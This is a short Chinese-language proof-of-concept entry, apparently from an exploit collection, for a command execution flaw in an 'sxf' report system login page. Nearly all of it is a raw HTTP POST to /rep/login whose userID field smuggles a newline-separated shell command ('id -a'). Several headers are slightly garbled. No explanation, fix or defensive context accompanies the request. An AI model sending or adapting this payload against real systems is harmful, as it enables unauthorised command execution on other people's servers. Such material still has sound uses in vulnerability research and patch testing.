## 某服 sxf-报表系统命令执行漏洞
```
POST /rep/login HTTP/1.1 
Host: URL
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 
Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 
Accept-Encoding: gzip deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te: trailers 
Connection: close 
Content-Type:application/x-www-form-urlencoded 
Content-Length: 126

clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid -a %0A&userPsw=tmbhuisq
```
